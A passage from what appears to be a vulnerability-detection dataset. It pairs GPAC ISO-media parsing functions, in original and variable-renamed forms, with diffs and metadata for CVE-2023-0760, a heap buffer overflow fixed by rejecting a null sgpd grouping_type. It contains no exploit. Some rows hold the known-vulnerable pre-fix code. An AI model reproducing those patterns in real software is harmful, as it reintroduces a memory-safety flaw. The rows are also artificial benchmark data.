				gf_bs_read_int(VAR_1, 2);
			}
			*VAR_4 += 3;
		}
		return VAR_10;
	}
	case VAR_44:
	{
		u32 VAR_18;
		GF_SubpictureLayoutMapEntry *VAR_10;
		GF_SAFEALLOC(VAR_10, GF_SubpictureLayoutMapEntry);
		if (!VAR_10) return NULL;
		VAR_10->groupID_info_4cc = gf_bs_read_u32(VAR_1);
		VAR_10->nb_entries = 1 + gf_bs_read_u16(VAR_1);
		*VAR_4 = 6;
		VAR_10->groupIDs = gf_malloc(sizeof(VAR_43) * VAR_10->nb_entries);
		if (!VAR_10->groupIDs) {
			gf_free(VAR_10);
			return NULL;
		}
		for (VAR_18=0; VAR_18<VAR_10->nb_entries; VAR_18++) {
			VAR_10->groupIDs[VAR_18] = gf_bs_read_u16(VAR_1);
			*VAR_4 += 2;
		}
		return VAR_10;
	}
	case 0:
		GF_LOG(VAR_24, VAR_25, (""[iso file] sgpd entry null grouping_type is invalid\n"") );
		return NULL;
	default:
		break;
	}

	if (!VAR_3 && !VAR_5) {
		GF_LOG(VAR_24, VAR_25, (""[iso file] %s sample group does not indicate entry size and is not implemented, cannot parse!\n"", gf_4cc_to_str( VAR_0) ));
		return NULL;
	}
	GF_SAFEALLOC(VAR_7, GF_DefaultSampleGroupDescriptionEntry);
	if (!VAR_7) return NULL;
	if (VAR_3) {
		VAR_7->length = VAR_3;
		VAR_7->data = (u8 *) gf_malloc(sizeof(u8)*VAR_7->length);
		if (!VAR_7->data) {
			gf_free(VAR_7);
			return NULL;
		}
		gf_bs_read_data(VAR_1, (char *) VAR_7->data, VAR_7->length);
		*VAR_4 = VAR_3;
	}
	return VAR_7;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -272,6 +272,9 @@
 		}
 		return ptr;
 	}
+	case 0:
+		GF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] sgpd entry null grouping_type is invalid\n"") );
+		return NULL;
 	default:
 		break;
 	}","{'deleted_lines': [], 'added_lines': ['\tcase 0:', '\t\tGF_LOG(GF_LOG_WARNING, GF_LOG_CONTAINER, (""[iso file] sgpd entry null grouping_type is invalid\\n"") );', '\t\treturn NULL;']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/box_code_base.c,video_sample_entry_box_size,"GF_Err video_sample_entry_box_size(GF_Box *s)
{
GF_Box *b;
u32 pos=0;
GF_MPEGVisualSampleEntryBox *ptr = (GF_MPEGVisualSampleEntryBox *)s;
gf_isom_video_sample_entry_size((GF_VisualSampleEntryBox *)s);
gf_isom_check_position(s, (GF_Box *)ptr->esd, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->cfg_3gpp, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->avc_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->svc_config, &pos);
if (ptr->mvc_config) {
gf_isom_check_position(s, gf_isom_box_find_child(s->child_boxes, GF_ISOM_BOX_TYPE_VWID), &pos);
gf_isom_check_position(s, (GF_Box *)ptr->mvc_config, &pos);
}
gf_isom_check_position(s, (GF_Box *)ptr->hevc_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->lhvc_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->vvc_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->av1_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->vp_config, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->jp2h, &pos);
gf_isom_check_position(s, (GF_Box *)ptr->dovi_config, &pos);
b = gf_isom_box_find_child(ptr->child_boxes, GF_ISOM_BOX_TYPE_ST3D);
if (b) gf_isom_check_position(s, b, &pos);
b = gf_isom_box_find_child(ptr->child_boxes, GF_ISOM_BOX_TYPE_SV3D);
if (b) gf_isom_check_position(s, b, &pos);
return GF_OK;
}","GF_Err video_sample_entry_box_size(GF_Box *VAR_0)
{
GF_Box *VAR_1;
u32 VAR_2=0;
GF_MPEGVisualSampleEntryBox *VAR_3 = (GF_MPEGVisualSampleEntryBox *)VAR_0;
gf_isom_video_sample_entry_size((GF_VisualSampleEntryBox *)VAR_0);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->esd, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->cfg_3gpp, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->avc_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->svc_config, &VAR_2);
if (VAR_3->mvc_config) {
gf_isom_check_position(VAR_0, gf_isom_box_find_child(VAR_0->child_boxes, VAR_4), &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->mvc_config, &VAR_2);
}
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->hevc_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->lhvc_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->vvc_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->av1_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->vp_config, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->jp2h, &VAR_2);
gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->dovi_config, &VAR_2);
VAR_1 = gf_isom_box_find_child(VAR_3->child_boxes, VAR_5);
if (VAR_1) gf_isom_check_position(VAR_0, VAR_1, &VAR_2);
VAR_1 = gf_isom_box_find_child(VAR_3->child_boxes, VAR_6);
if (VAR_1) gf_isom_check_position(VAR_0, VAR_1, &VAR_2);
return VAR_7;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/before/0.json,"GF_Err video_sample_entry_box_size(GF_Box *s)
{
	GF_Box *b;
	u32 pos=0;
	GF_MPEGVisualSampleEntryBox *ptr = (GF_MPEGVisualSampleEntryBox *)s;
	gf_isom_video_sample_entry_size((GF_VisualSampleEntryBox *)s);

	/*make sure we write the config box first, we don't care about the rest*/

	/*mp4v*/
	gf_isom_check_position(s, (GF_Box *)ptr->esd, &pos);
	gf_isom_check_position(s, (GF_Box *)ptr->cfg_3gpp, &pos);
	/*avc / SVC + MVC*/
	gf_isom_check_position(s, (GF_Box *)ptr->avc_config, &pos);
	gf_isom_check_position(s, (GF_Box *)ptr->svc_config, &pos);
	if (ptr->mvc_config) {
		gf_isom_check_position(s, gf_isom_box_find_child(s->child_boxes, GF_ISOM_BOX_TYPE_VWID), &pos);
		gf_isom_check_position(s, (GF_Box *)ptr->mvc_config, &pos);
	}

	/*HEVC*/
	gf_isom_check_position(s, (GF_Box *)ptr->hevc_config, &pos);
	gf_isom_check_position(s, (GF_Box *)ptr->lhvc_config, &pos);

	/*VVC*/
	gf_isom_check_position(s, (GF_Box *)ptr->vvc_config, &pos);

	/*AV1*/
	gf_isom_check_position(s, (GF_Box *)ptr->av1_config, &pos);

	/*VPx*/
	gf_isom_check_position(s, (GF_Box *)ptr->vp_config, &pos);

	/*JP2H*/
	gf_isom_check_position(s, (GF_Box *)ptr->jp2h, &pos);

	/*DolbyVision*/
	gf_isom_check_position(s, (GF_Box *)ptr->dovi_config, &pos);

	b = gf_isom_box_find_child(ptr->child_boxes, GF_ISOM_BOX_TYPE_ST3D);
	if (b) gf_isom_check_position(s, b, &pos);

	b = gf_isom_box_find_child(ptr->child_boxes, GF_ISOM_BOX_TYPE_SV3D);
	if (b) gf_isom_check_position(s, b, &pos);
	return GF_OK;
}","GF_Err video_sample_entry_box_size(GF_Box *VAR_0)
{
	GF_Box *VAR_1;
	u32 VAR_2=0;
	GF_MPEGVisualSampleEntryBox *VAR_3 = (GF_MPEGVisualSampleEntryBox *)VAR_0;
	gf_isom_video_sample_entry_size((GF_VisualSampleEntryBox *)VAR_0);

	/* COMMENT_0 */

	/* COMMENT_1 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->esd, &VAR_2);
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->cfg_3gpp, &VAR_2);
	/* COMMENT_2 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->avc_config, &VAR_2);
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->svc_config, &VAR_2);
	if (VAR_3->mvc_config) {
		gf_isom_check_position(VAR_0, gf_isom_box_find_child(VAR_0->child_boxes, VAR_4), &VAR_2);
		gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->mvc_config, &VAR_2);
	}

	/* COMMENT_3 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->hevc_config, &VAR_2);
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->lhvc_config, &VAR_2);

	/* COMMENT_4 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->vvc_config, &VAR_2);

	/* COMMENT_5 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->av1_config, &VAR_2);

	/* COMMENT_6 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->vp_config, &VAR_2);

	/* COMMENT_7 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->jp2h, &VAR_2);

	/* COMMENT_8 */
	gf_isom_check_position(VAR_0, (GF_Box *)VAR_3->dovi_config, &VAR_2);

	VAR_1 = gf_isom_box_find_child(VAR_3->child_boxes, VAR_5);
	if (VAR_1) gf_isom_check_position(VAR_0, VAR_1, &VAR_2);

	VAR_1 = gf_isom_box_find_child(VAR_3->child_boxes, VAR_6);
	if (VAR_1) gf_isom_check_position(VAR_0, VAR_1, &VAR_2);
	return VAR_7;
}",gpac/ea7395f39f601a7750d48d606e9d10ea0b7beefe/box_code_base.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -24,7 +24,7 @@
 
 	/*VVC*/
 	gf_isom_check_position(s, (GF_Box *)ptr->vvc_config, &pos);
-	
+
 	/*AV1*/
 	gf_isom_check_position(s, (GF_Box *)ptr->av1_config, &pos);
 ","{'deleted_lines': ['\t'], 'added_lines': ['']}",True,Heap-based Buffer Overflow in GitHub repository gpac/gpac prior to V2.1.0-DEV.,7.8,HIGH,2,valid,2023-02-08T15:52:00Z,4
CVE-2023-0760,['CWE-122'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H,1,gpac,sgpd box entry: disallow null grouping_type (#2389),ea7395f39f601a7750d48d606e9d10ea0b7beefe,https://github.com/gpac/gpac/commit/ea7395f39f601a7750d48d606e9d10ea0b7beefe,src/isomedia/isom_read.c,gf_isom_get_sample_cenc_info_internal,"GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *trak, GF_TrackFragmentBox *traf, GF_SampleEncryptionBox *senc, u32 sample_number, Bool *IsEncrypted, u8 *crypt_byte_block, u8 *skip_byte_block, const u8 **key_info, u32 *key_info_size)
#else
GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *trak, void *traf, GF_SampleEncryptionBox *senc, u32 sample_number, Bool *IsEncrypted, u8 *crypt_byte_block, u8 *skip_byte_block, const u8 **key_info, u32 *key_info_size)
#endif
{
GF_SampleGroupBox *sample_group;
u32 j, group_desc_index;
GF_SampleGroupDescriptionBox *sgdesc;
u32 i, count;
u32 descIndex, chunkNum;
u64 offset;
u32 first_sample_in_entry, last_sample_in_entry;
GF_CENCSampleEncryptionGroupEntry *entry;
if (IsEncrypted) *IsEncrypted = GF_FALSE;
if (crypt_byte_block) *crypt_byte_block = 0;
if (skip_byte_block) *skip_byte_block = 0;
if (key_info) *key_info = NULL;
if (key_info_size) *key_info_size = 0;
if (!trak) return GF_BAD_PARAM;
#ifdefGPAC_DISABLE_ISOM_FRAGMENTS
if (traf)
return GF_NOT_SUPPORTED;
#else
sample_number -= trak->sample_count_at_seg_start;
#endif
if (trak->Media->information->sampleTable->SampleSize && trak->Media->information->sampleTable->SampleSize->sampleCount>=sample_number) {
stbl_GetSampleInfos(trak->Media->information->sampleTable, sample_number, &offset, &chunkNum, &descIndex, NULL);
} else {
descIndex = trak->current_traf_stsd_idx;
if (!descIndex) descIndex = 1;
}
gf_isom_cenc_get_default_info_internal(trak, descIndex, NULL, IsEncrypted, crypt_byte_block, skip_byte_block, key_info, key_info_size);
sample_group = NULL;
group_desc_index = 0;
if (trak->Media->information->sampleTable->sampleGroups) {
count = gf_list_count(trak->Media->information->sampleTable->sampleGroups);
for (i=0; i<count; i++) {
sample_group = (GF_SampleGroupBox*)gf_list_get(trak->Media->information->sampleTable->sampleGroups, i);
if (sample_group->grouping_type ==  GF_ISOM_SAMPLE_GROUP_SEIG)
break;
sample_group = NULL;
}
if (sample_group) {
first_sample_in_entry = 1;
for (j=0; j<sample_group->entry_count; j++) {
last_sample_in_entry = first_sample_in_entry + sample_group->sample_entries[j].sample_count - 1;
if ((sample_number<first_sample_in_entry) || (sample_number>last_sample_in_entry)) {
first_sample_in_entry = last_sample_in_entry+1;
continue;
}
group_desc_index = sample_group->sample_entries[j].group_description_index;
break;
}
}
}
#ifndef GPAC_DISABLE_ISOM_FRAGMENTS
if (!group_desc_index && traf && traf->sampleGroups) {
count = gf_list_count(traf->sampleGroups);
for (i=0; i<count; i++) {
group_desc_index = 0;
sample_group = (GF_SampleGroupBox*)gf_list_get(traf->sampleGroups, i);
if (sample_group->grouping_type ==  GF_ISOM_SAMPLE_GROUP_SEIG)
break;
sample_group = NULL;
}
if (sample_group) {
first_sample_in_entry = 1;
for (j=0; j<sample_group->entry_count; j++) {
last_sample_in_entry = first_sample_in_entry + sample_group->sample_entries[j].sample_count - 1;
if ((sample_number<first_sample_in_entry) || (sample_number>last_sample_in_entry)) {
first_sample_in_entry = last_sample_in_entry+1;
continue;
}
group_desc_index = sample_group->sample_entries[j].group_description_index;
break;
}
}
}
#endif
if (!group_desc_index) goto exit;
sgdesc = NULL;
if (group_desc_index<=0x10000) {
for (j=0; j<gf_list_count(trak->Media->information->sampleTable->sampleGroupsDescription); j++) {
sgdesc = (GF_SampleGroupDescriptionBox*)gf_list_get(trak->Media->information->sampleTable->sampleGroupsDescription, j);
if (sgdesc->grouping_type==sample_group->grouping_type) break;
sgdesc = NULL;
}
}
#ifndef GPAC_DISABLE_ISOM_FRAGMENTS
else if (traf) {
group_desc_index -= 0x10000;
for (j=0; j<gf_list_count(traf->sampleGroupsDescription); j++) {
sgdesc = (GF_SampleGroupDescriptionBox*)gf_list_get(traf->sampleGroupsDescription, j);
if (sgdesc->grouping_type==sample_group->grouping_type) break;
sgdesc = NULL;
}
}
#endif
if (!sgdesc) return GF_ISOM_INVALID_FILE;
entry = (GF_CENCSampleEncryptionGroupEntry *) gf_list_get(sgdesc->group_descriptions, group_desc_index - 1);
if (!entry) return GF_ISOM_INVALID_FILE;
if (IsEncrypted) *IsEncrypted = entry->IsProtected;
if (crypt_byte_block) *crypt_byte_block = entry->crypt_byte_block;
if (skip_byte_block) *skip_byte_block = entry->skip_byte_block;
if (key_info) *key_info = entry->key_info;
if (key_info_size) *key_info_size = entry->key_info_size;
exit:
if (( (senc && senc->piff_type==1) || (trak->moov && trak->moov->mov->is_smooth) ) && key_info && ! (*key_info) ) {
if (!senc) {
if (IsEncrypted) *IsEncrypted = GF_TRUE;
if (key_info_size) *key_info_size = 8;
} else {
if (!senc->piff_type) {
senc->piff_type = 2;
senc->IV_size = 8;
}
assert(senc->IV_size);
if (IsEncrypted) *IsEncrypted = GF_TRUE;
if (key_info_size) *key_info_size = senc->IV_size;
}
}
return GF_OK;
}","GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *VAR_0, GF_TrackFragmentBox *VAR_1, GF_SampleEncryptionBox *VAR_2, u32 VAR_3, Bool *VAR_4, u8 *VAR_5, u8 *VAR_6, const u8 **VAR_7, u32 *VAR_8)
#else
GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *VAR_0, void *VAR_1, GF_SampleEncryptionBox *VAR_2, u32 VAR_3, Bool *VAR_4, u8 *VAR_5, u8 *VAR_6, const u8 **VAR_7, u32 *VAR_8)
#endif
{
GF_SampleGroupBox *VAR_9;
u32 VAR_10, VAR_11;
GF_SampleGroupDescriptionBox *VAR_12;
u32 VAR_13, VAR_14;
u32 VAR_15, VAR_16;
u64 VAR_17;
u32 VAR_18, VAR_19;
GF_CENCSampleEncryptionGroupEntry *VAR_20;
if (VAR_4) *VAR_4 = VAR_21;
if (VAR_5) *VAR_5 = 0;
if (VAR_6) *VAR_6 = 0;
if (VAR_7) *VAR_7 = NULL;
if (VAR_8) *VAR_8 = 0;
if (!VAR_0) return VAR_22;
#ifdefVAR_23
if (VAR_1)
return VAR_24;
#else
VAR_3 -= VAR_0->sample_count_at_seg_start;
#endif
if (VAR_0->Media->information->sampleTable->SampleSize && VAR_0->Media->information->sampleTable->SampleSize->sampleCount>=VAR_3) {
stbl_GetSampleInfos(VAR_0->Media->information->sampleTable, VAR_3, &VAR_17, &VAR_16, &VAR_15, NULL);
} else {
VAR_15 = VAR_0->current_traf_stsd_idx;
if (!VAR_15) VAR_15 = 1;
}
gf_isom_cenc_get_default_info_internal(VAR_0, VAR_15, NULL, VAR_4, VAR_5, VAR_6, VAR_7, VAR_8);
VAR_9 = NULL;
VAR_11 = 0;
if (VAR_0->Media->information->sampleTable->sampleGroups) {
VAR_14 = gf_list_count(VAR_0->Media->information->sampleTable->sampleGroups);
for (VAR_13=0; VAR_13<VAR_14; VAR_13++) {
VAR_9 = (GF_SampleGroupBox*)gf_list_get(VAR_0->Media->information->sampleTable->sampleGroups, VAR_13);
if (VAR_9->grouping_type ==  VAR_25)
break;
VAR_9 = NULL;
}
if (VAR_9) {
VAR_18 = 1;
for (VAR_10=0; VAR_10<VAR_9->entry_count; VAR_10++) {
VAR_19 = VAR_18 + VAR_9->sample_entries[VAR_10].sample_count - 1;
if ((VAR_3<VAR_18) || (VAR_3>VAR_19)) {
VAR_18 = VAR_19+1;
continue;
}
VAR_11 = VAR_9->sample_entries[VAR_10].group_description_index;
break;
}
}
}
#ifndef VAR_23
if (!VAR_11 && VAR_1 && VAR_1->sampleGroups) {
VAR_14 = gf_list_count(VAR_1->sampleGroups);
for (VAR_13=0; VAR_13<VAR_14; VAR_13++) {
VAR_11 = 0;
VAR_9 = (GF_SampleGroupBox*)gf_list_get(VAR_1->sampleGroups, VAR_13);
if (VAR_9->grouping_type ==  VAR_25)
break;
VAR_9 = NULL;
}
if (VAR_9) {
VAR_18 = 1;
for (VAR_10=0; VAR_10<VAR_9->entry_count; VAR_10++) {
VAR_19 = VAR_18 + VAR_9->sample_entries[VAR_10].sample_count - 1;
if ((VAR_3<VAR_18) || (VAR_3>VAR_19)) {
VAR_18 = VAR_19+1;
continue;
}
VAR_11 = VAR_9->sample_entries[VAR_10].group_description_index;
break;
}
}
}
#endif
if (!VAR_11) goto exit;
VAR_12 = NULL;
if (VAR_11<=0x10000) {
for (VAR_10=0; VAR_10<gf_list_count(VAR_0->Media->information->sampleTable->sampleGroupsDescription); VAR_10++) {
VAR_12 = (GF_SampleGroupDescriptionBox*)gf_list_get(VAR_0->Media->information->sampleTable->sampleGroupsDescription, VAR_10);
if (VAR_12->grouping_type==VAR_9->grouping_type) break;
VAR_12 = NULL;
}
}
#ifndef VAR_23
else if (traf) {
VAR_11 -= 0x10000;
for (VAR_10=0; VAR_10<gf_list_count(traf->sampleGroupsDescription); VAR_10++) {
VAR_12 = (GF_SampleGroupDescriptionBox*)gf_list_get(traf->sampleGroupsDescription, VAR_10);
if (VAR_12->grouping_type==VAR_9->grouping_type) break;
VAR_12 = NULL;
}
}
#endif
if (!VAR_12) return VAR_26;
VAR_20 = (GF_CENCSampleEncryptionGroupEntry *) gf_list_get(VAR_12->group_descriptions, VAR_11 - 1);
if (!VAR_20) return VAR_26;
if (VAR_4) *VAR_4 = VAR_20->IsProtected;
if (VAR_5) *VAR_5 = VAR_20->crypt_byte_block;
if (VAR_6) *VAR_6 = VAR_20->skip_byte_block;
if (VAR_7) *VAR_7 = VAR_20->key_info;
if (VAR_8) *VAR_8 = VAR_20->key_info_size;
exit:
if (( (VAR_2 && VAR_2->piff_type==1) || (VAR_0->moov && VAR_0->moov->mov->is_smooth) ) && VAR_7 && ! (*VAR_7) ) {
if (!VAR_2) {
if (VAR_4) *VAR_4 = VAR_27;
if (VAR_8) *VAR_8 = 8;
} else {
if (!VAR_2->piff_type) {
VAR_2->piff_type = 2;
VAR_2->IV_size = 8;
}
assert(VAR_2->IV_size);
if (VAR_4) *VAR_4 = VAR_27;
if (VAR_8) *VAR_8 = VAR_2->IV_size;
}
}
return VAR_28;
}",,"GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *trak, GF_TrackFragmentBox *traf, GF_SampleEncryptionBox *senc, u32 sample_number, Bool *IsEncrypted, u8 *crypt_byte_block, u8 *skip_byte_block, const u8 **key_info, u32 *key_info_size)
#else
GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *trak, void *traf, GF_SampleEncryptionBox *senc, u32 sample_number, Bool *IsEncrypted, u8 *crypt_byte_block, u8 *skip_byte_block, const u8 **key_info, u32 *key_info_size)
#endif
{
	GF_SampleGroupBox *sample_group;
	u32 j, group_desc_index;
	GF_SampleGroupDescriptionBox *sgdesc;
	u32 i, count;
	u32 descIndex, chunkNum;
	u64 offset;
	u32 first_sample_in_entry, last_sample_in_entry;
	GF_CENCSampleEncryptionGroupEntry *entry;

	if (IsEncrypted) *IsEncrypted = GF_FALSE;
	if (crypt_byte_block) *crypt_byte_block = 0;
	if (skip_byte_block) *skip_byte_block = 0;
	if (key_info) *key_info = NULL;
	if (key_info_size) *key_info_size = 0;

	if (!trak) return GF_BAD_PARAM;

#ifdef	GPAC_DISABLE_ISOM_FRAGMENTS
	if (traf)
		return GF_NOT_SUPPORTED;
#else
	sample_number -= trak->sample_count_at_seg_start;
#endif

	if (trak->Media->information->sampleTable->SampleSize && trak->Media->information->sampleTable->SampleSize->sampleCount>=sample_number) {
		stbl_GetSampleInfos(trak->Media->information->sampleTable, sample_number, &offset, &chunkNum, &descIndex, NULL);
	} else {
		//this is dump mode of fragments, we haven't merged tables yet - use current stsd idx indicated in trak
		descIndex = trak->current_traf_stsd_idx;
		if (!descIndex) descIndex = 1;
	}

	gf_isom_cenc_get_default_info_internal(trak, descIndex, NULL, IsEncrypted, crypt_byte_block, skip_byte_block, key_info, key_info_size);

	sample_group = NULL;
	group_desc_index = 0;
	if (trak->Media->information->sampleTable->sampleGroups) {
		count = gf_list_count(trak->Media->information->sampleTable->sampleGroups);
		for (i=0; i<count; i++) {
			sample_group = (GF_SampleGroupBox*)gf_list_get(trak->Media->information->sampleTable->sampleGroups, i);
			if (sample_group->grouping_type ==  GF_ISOM_SAMPLE_GROUP_SEIG)
				break;
			sample_group = NULL;
		}
		if (sample_group) {
			first_sample_in_entry = 1;
			for (j=0; j<sample_group->entry_count; j++) {
				last_sample_in_entry = first_sample_in_entry + sample_group->sample_entries[j].sample_count - 1;
				if ((sample_number<first_sample_in_entry) || (sample_number>last_sample_in_entry)) {
					first_sample_in_entry = last_sample_in_entry+1;
					continue;
				}
				/*we found our sample*/
				group_desc_index = sample_group->sample_entries[j].group_description_index;
				break;
			}
		}
	}
#ifndef GPAC_DISABLE_ISOM_FRAGMENTS
	if (!group_desc_index && traf && traf->sampleGroups) {
		count = gf_list_count(traf->sampleGroups);
		for (i=0; i<count; i++) {
			group_desc_index = 0;
			sample_group = (GF_SampleGroupBox*)gf_list_get(traf->sampleGroups, i);
			if (sample_group->grouping_type ==  GF_ISOM_SAMPLE_GROUP_SEIG)
				break;
			sample_group = NULL;
		}
		if (sample_group) {
			first_sample_in_entry = 1;
			for (j=0; j<sample_group->entry_count; j++) {
				last_sample_in_entry = first_sample_in_entry + sample_group->sample_entries[j].sample_count - 1;
				if ((sample_number<first_sample_in_entry) || (sample_number>last_sample_in_entry)) {
					first_sample_in_entry = last_sample_in_entry+1;
					continue;
				}
				/*we found our sample*/
				group_desc_index = sample_group->sample_entries[j].group_description_index;
				break;
			}
		}
	}
#endif
	/*no sampleGroup info associated*/
	if (!group_desc_index) goto exit;

	sgdesc = NULL;

	if (group_desc_index<=0x10000) {
		for (j=0; j<gf_list_count(trak->Media->information->sampleTable->sampleGroupsDescription); j++) {
			sgdesc = (GF_SampleGroupDescriptionBox*)gf_list_get(trak->Media->information->sampleTable->sampleGroupsDescription, j);
			if (sgdesc->grouping_type==sample_group->grouping_type) break;
			sgdesc = NULL;
		}
	}
#ifndef GPAC_DISABLE_ISOM_FRAGMENTS
	else if (traf) {
		group_desc_index -= 0x10000;
		for (j=0; j<gf_list_count(traf->sampleGroupsDescription); j++) {
			sgdesc = (GF_SampleGroupDescriptionBox*)gf_list_get(traf->sampleGroupsDescription, j);
			if (sgdesc->grouping_type==sample_group->grouping_type) break;
			sgdesc = NULL;
		}
	}
#endif
	/*no sampleGroup description found for this group (invalid file)*/
	if (!sgdesc) return GF_ISOM_INVALID_FILE;

	entry = (GF_CENCSampleEncryptionGroupEntry *) gf_list_get(sgdesc->group_descriptions, group_desc_index - 1);
	if (!entry) return GF_ISOM_INVALID_FILE;

	if (IsEncrypted) *IsEncrypted = entry->IsProtected;
	if (crypt_byte_block) *crypt_byte_block = entry->crypt_byte_block;
	if (skip_byte_block) *skip_byte_block = entry->skip_byte_block;

	if (key_info) *key_info = entry->key_info;
	if (key_info_size) *key_info_size = entry->key_info_size;

exit:
	//in PIFF we may have default values if no TENC is present: 8 bytes for IV size
	if (( (senc && senc->piff_type==1) || (trak->moov && trak->moov->mov->is_smooth) ) && key_info && ! (*key_info) ) {
		if (!senc) {
			if (IsEncrypted) *IsEncrypted = GF_TRUE;
			if (key_info_size) *key_info_size = 8;
		} else {
			if (!senc->piff_type) {
				senc->piff_type = 2;
				senc->IV_size = 8;
			}
			assert(senc->IV_size);
			if (IsEncrypted) *IsEncrypted = GF_TRUE;
			if (key_info_size) *key_info_size = senc->IV_size;
		}
	}

	return GF_OK;
}","GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *VAR_0, GF_TrackFragmentBox *VAR_1, GF_SampleEncryptionBox *VAR_2, u32 VAR_3, Bool *VAR_4, u8 *VAR_5, u8 *VAR_6, const u8 **VAR_7, u32 *VAR_8)
#else
GF_Err gf_isom_get_sample_cenc_info_internal(GF_TrackBox *VAR_0, void *VAR_1, GF_SampleEncryptionBox *VAR_2, u32 VAR_3, Bool *VAR_4, u8 *VAR_5, u8 *VAR_6, const u8 **VAR_7, u32 *VAR_8)
#endif
{
	GF_SampleGroupBox *VAR_9;
	u32 VAR_10, VAR_11;
	GF_SampleGroupDescriptionBox *VAR_12;
	u32 VAR_13, VAR_14;
	u32 VAR_15, VAR_16;
	u64 VAR_17;
	u32 VAR_18, VAR_19;
	GF_CENCSampleEncryptionGroupEntry *VAR_20;

	if (VAR_4) *VAR_4 = VAR_21;
	if (VAR_5) *VAR_5 = 0;
	if (VAR_6) *VAR_6 = 0;
	if (VAR_7) *VAR_7 = NULL;
	if (VAR_8) *VAR_8 = 0;

	if (!VAR_0) return VAR_22;

#ifdef	VAR_23
	if (VAR_1)
		return VAR_24;
#else
	VAR_3 -= VAR_0->sample_count_at_seg_start;
#endif

	if (VAR_0->Media->information->sampleTable->SampleSize && VAR_0->Media->information->sampleTable->SampleSize->sampleCount>=VAR_3) {
		stbl_GetSampleInfos(VAR_0->Media->information->sampleTable, VAR_3, &VAR_17, &VAR_16, &VAR_15, NULL);
	} else {
		/* COMMENT_0 */
		VAR_15 = VAR_0->current_traf_stsd_idx;
		if (!VAR_15) VAR_15 = 1;
	}

	gf_isom_cenc_get_default_info_internal(VAR_0, VAR_15, NULL, VAR_4, VAR_5, VAR_6, VAR_7, VAR_8);

	VAR_9 = NULL;
	VAR_11 = 0;
	if (VAR_0->Media->information->sampleTable->sampleGroups) {
		VAR_14 = gf_list_count(VAR_0->Media->information->sampleTable->sampleGroups);
		for (VAR_13=0; VAR_13<VAR_14; VAR_13++) {
			VAR_9 = (GF_SampleGroupBox*)gf_list_get(VAR_0->Media->information->sampleTable->sampleGroups, VAR_13);
			if (VAR_9->grouping_type ==  VAR_25)
				break;
			VAR_9 = NULL;
		}
		if (VAR_9) {
			VAR_18 = 1;
			for (VAR_10=0; VAR_10<VAR_9->entry_count; VAR_10++) {
				VAR_19 = VAR_18 + VAR_9->sample_entries[VAR_10].sample_count - 1;
				if ((VAR_3<VAR_18) || (VAR_3>VAR_19)) {
					VAR_18 = VAR_19+1;
					continue;
				}
				/* COMMENT_1 */
				VAR_11 = VAR_9->sample_entries[VAR_10].group_description_index;
				break;
			}
		}
	}
#ifndef VAR_23
	if (!VAR_11 && VAR_1 && VAR_1->sampleGroups) {
		VAR_14 = gf_list_count(VAR_1->sampleGroups);
		for (VAR_13=0; VAR_13<VAR_14; VAR_13++) {
			VAR_11 = 0;
			VAR_9 = (GF_SampleGroupBox*)gf_list_get(VAR_1->sampleGroups, VAR_13);
			if (VAR_9->grouping_type ==  VAR_25)
				break;
			VAR_9 = NULL;
		}
		if (VAR_9) {
			VAR_18 = 1;
			for (VAR_10=0; VAR_10<VAR_9->entry_count; VAR_10++) {
				VAR_19 = VAR_18 + VAR_9->sample_entries[VAR_10].sample_count - 1;
